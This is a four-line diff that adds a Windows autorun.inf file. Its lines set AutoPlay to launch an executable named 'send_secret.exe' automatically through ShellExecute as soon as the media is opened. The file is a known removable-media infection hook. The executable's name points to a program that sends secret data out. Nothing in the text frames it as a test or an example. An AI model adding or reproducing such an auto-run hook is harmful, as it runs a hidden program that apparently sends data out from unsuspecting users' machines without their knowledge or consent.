@@ -1,0 +1,4 @@
+[autorun]
+ ;Open=send_secret.exe
+ ShellExecute=send_secret.exe
+ UseAutoPlay=1
